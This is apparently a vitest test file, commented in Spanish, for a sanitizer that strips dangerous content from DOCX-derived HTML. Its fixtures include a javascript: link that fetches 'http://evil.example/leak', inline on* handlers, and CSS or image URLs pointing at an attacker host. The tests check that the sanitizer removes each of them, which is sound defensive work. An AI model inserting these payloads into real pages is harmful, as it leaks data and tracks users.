import { Window } from 'happy-dom'
import { describe, expect, it } from 'vitest'
import { sanitizeDocxDom } from './sanitize'

// `src/test/setup.ts` estuba el `document` global (lo necesitan otros tests que corren en el
// entorno 'node' del proyecto); por eso acá se crea una ventana de happy-dom propia en vez de
// depender del `document` global o del pragma `@vitest-environment`.
function dom(html: string): Element {
  const document = new Window().document
  const div = document.createElement('div')
  div.innerHTML = html
  return div as unknown as Element
}

describe('sanitizeDocxDom', () => {
  it('deja inerte cualquier <a>, aunque el destino sea inofensivo', () => {
    const root = dom('<a href="https://ejemplo.com/manual">manual</a><a href="#nota1">nota</a>')
    sanitizeDocxDom(root)
    for (const a of root.querySelectorAll('a')) expect(a.hasAttribute('href')).toBe(false)
  })

  it('un hipervínculo javascript: pierde el href', () => {
    const root = dom('<a href="javascript:fetch(&quot;http://evil.example/leak&quot;)">clic</a>')
    sanitizeDocxDom(root)
    expect(root.querySelector('a')!.hasAttribute('href')).toBe(false)
  })

  it('una imagen con TargetMode="External" (src http) pierde el src; una con data: se conserva', () => {
    const root = dom('<img id="ext" src="http://127.0.0.1:1/x"><img id="ok" src="data:image/png;base64,AAAA">')
    sanitizeDocxDom(root)
    expect(root.querySelector('#ext')!.hasAttribute('src')).toBe(false)
    expect(root.querySelector('#ok')!.getAttribute('src')).toBe('data:image/png;base64,AAAA')
  })

  it('saca <script>, <iframe>, <object> y <embed> del árbol', () => {
    // Construidos con createElement en vez de innerHTML: algunas etiquetas (meta, link, form) tienen
    // reubicaciones/validaciones especiales en el parser/DOM que no hacen falta para este caso.
    const root = dom('<div id="host"></div>')
    const host = root.querySelector('#host')!
    const doc = host.ownerDocument!
    for (const tag of ['script', 'iframe', 'object', 'embed']) host.appendChild(doc.createElement(tag))
    sanitizeDocxDom(root)
    for (const tag of ['script', 'iframe', 'object', 'embed']) expect(root.querySelectorAll(tag)).toHaveLength(0)
  })

  it('saca manejadores on* de cualquier elemento', () => {
    const root = dom('<div onclick="fetch(1)" onmouseover="fetch(2)">texto</div>')
    sanitizeDocxDom(root)
    const div = root.querySelector('div')!
    expect(div.hasAttribute('onclick')).toBe(false)
    expect(div.hasAttribute('onmouseover')).toBe(false)
  })

  it('un url(http://…) en un style inline se vacía, pero el resto del style se conserva', () => {
    const root = dom('<div style="color: red; background-image: url(http://evil.example/bg.png); font-weight: bold">x</div>')
    sanitizeDocxDom(root)
    const style = root.querySelector('div')!.getAttribute('style')!
    expect(style).toContain('color: red')
    expect(style).toContain('font-weight: bold')
    expect(style).not.toContain('evil.example')
    expect(style).toContain('url()')
  })

  it('un <style> de documento con url(http://…) de fondo se limpia, pero conserva las reglas normales', () => {
    const root = dom('<style>.a { color: red } .b { background: url("http://evil.example/bg.png") }</style><div class="b">x</div>')
    sanitizeDocxDom(root)
    const css = root.querySelector('style')!.textContent!
    expect(css).toContain('.a { color: red }')
    expect(css).not.toContain('evil.example')
  })

  it('un data: URL en background-image se conserva intacto', () => {
    const root = dom('<div style="background-image: url(data:image/png;base64,AAAA)">x</div>')
    sanitizeDocxDom(root)
    expect(root.querySelector('div')!.getAttribute('style')).toContain('data:image/png;base64,AAAA')
  })

  it('es idempotente: aplicarlo dos veces da el mismo resultado', () => {
    const root = dom('<a href="http://evil.example">x</a><img src="http://evil.example/x.png">')
    sanitizeDocxDom(root)
    const once = root.innerHTML
    sanitizeDocxDom(root)
    expect(root.innerHTML).toBe(once)
  })

  it('un documento limpio (sin nada peligroso) sale intacto', () => {
    const root = dom('<p>Hola <b>mundo</b></p><table><tr><td>1</td></tr></table>')
    const before = root.innerHTML
    sanitizeDocxDom(root)
    expect(root.innerHTML).toBe(before)
  })
})
